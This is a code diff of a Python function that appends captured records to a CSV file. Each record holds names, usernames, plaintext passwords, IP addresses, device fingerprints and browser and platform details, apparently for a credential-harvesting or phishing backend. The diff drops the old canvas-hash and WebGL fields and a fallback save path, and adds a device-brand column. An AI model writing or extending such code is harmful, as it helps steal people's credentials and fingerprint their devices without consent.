@@ -279,126 +279,44 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
     script_dir = os.path.dirname(os.path.abspath(__file__))
     csv_path = os.path.join(script_dir, 'data.csv')
     
-    # Parse browser info from JSON string to dict
     try:
-        browser_details = json.loads(browser_info)
-    except:
-        browser_details = {"full_user_agent": browser_info}
-    
-    try:
-        file_exists = os.path.isfile(csv_path)
+        platform_info = json.loads(browser_info)
         
-        with open(csv_path, 'a', newline='\n') as csvfile:
-            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
-
-            """
-            if file does not exist or is empty, it will write header
-            """
-            if not file_exists or os.stat(csv_path).st_size == 0:
-                writer.writerow([
-                    'first_name',
-                    'last_name',
-                    'username',
-                    'password',
-                    'timestamp', 
-                    'ip_address', 
-                    'device_fingerprint', 
-                    'device_type', 
-                    'browser_name', 
-                    'browser_version', 
-                    'os_name', 
-                    'os_version', 
-                    'language',
-                    'screen_resolution',
-                    'timezone',
-                    'canvas_hash',
-                    'webgl_info',
-                    'full_user_agent'
-                ])
-                csvfile.flush()
-
-            # append all data with detailed browser info
+        # Get the values from platform_info
+        device_type = platform_info.get('deviceType', 'Unknown')
+        device_brand = platform_info.get('deviceBrand', 'Unknown')
+        os_name = platform_info.get('os_name', 'Unknown')
+        os_version = platform_info.get('os_version', 'Unknown')
+        browser_name = platform_info.get('browser_name', 'Unknown')
+        browser_version = platform_info.get('browser_version', 'Unknown')
+        screen_resolution = platform_info.get('screen_resolution', 'Unknown')
+        timezone = platform_info.get('timezone', 'Unknown')
+        full_user_agent = platform_info.get('full_user_agent', 'Unknown')
+        
+        # Write to CSV with the correct column names
+        with open(csv_path, 'a', newline='') as csvfile:
+            writer = csv.writer(csvfile)
             writer.writerow([
                 firstname,
                 lastname,
                 username,
                 password,
-                timestamp, 
-                ip_address, 
-                device_fingerprint, 
-                device_type, 
-                browser_details.get('browser_name', 'Unknown'),
-                browser_details.get('browser_version', 'Unknown'),
-                browser_details.get('os_name', 'Unknown'),
-                browser_details.get('os_version', 'Unknown'),
-                browser_details.get('language', 'Unknown'),
-                browser_details.get('screen_resolution', 'Unknown'),
-                browser_details.get('timezone', 'Unknown'),
-                browser_details.get('canvas_hash', 'Unknown'),
-                browser_details.get('webgl_info', 'Unknown'),
-                browser_details.get('full_user_agent', 'Unknown')
+                timestamp,
+                ip_address,
+                device_fingerprint,
+                device_type,
+                device_brand,  # New column
+                os_name,
+                os_version,
+                browser_name,
+                browser_version,
+                screen_resolution,
+                timezone,
+                full_user_agent
             ])
-            csvfile.flush()
-            
-        # Update the last modified timestamp
-        update_last_modified_timestamp()
             
     except Exception as e:
-        """
-        if writing to default location fails, it will go alternative way/append
-        to navigate it's location request.
-        """
-        fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
-        with open(fallback_path, 'a', newline='\n') as csvfile:
-            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
-            
-            if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
-                writer.writerow([
-                    'first_name',
-                    'last_name',
-                    'username',
-                    'password',
-                    'timestamp', 
-                    'ip_address', 
-                    'device_fingerprint', 
-                    'device_type', 
-                    'browser_name', 
-                    'browser_version', 
-                    'os_name', 
-                    'os_version', 
-                    'language',
-                    'screen_resolution',
-                    'timezone',
-                    'canvas_hash',
-                    'webgl_info',
-                    'full_user_agent'
-                ])
-                csvfile.flush()
-            
-            writer.writerow([
-                firstname,
-                lastname,
-                username,
-                password,
-                timestamp, 
-                ip_address, 
-                device_fingerprint, 
-                device_type, 
-                browser_details.get('browser_name', 'Unknown'),
-                browser_details.get('browser_version', 'Unknown'),
-                browser_details.get('os_name', 'Unknown'),
-                browser_details.get('os_version', 'Unknown'),
-                browser_details.get('language', 'Unknown'),
-                browser_details.get('screen_resolution', 'Unknown'),
-                browser_details.get('timezone', 'Unknown'),
-                browser_details.get('canvas_hash', 'Unknown'),
-                browser_details.get('webgl_info', 'Unknown'),
-                browser_details.get('full_user_agent', 'Unknown')
-            ])
-            csvfile.flush()
-            
-        # Update the last modified timestamp (for fallback path)
-        update_last_modified_timestamp(fallback_path)
+        print(f"Error saving data: {str(e)}")
 
 def update_last_modified_timestamp(csv_path=None):
     """Update the timestamp for when the data was last modified"""
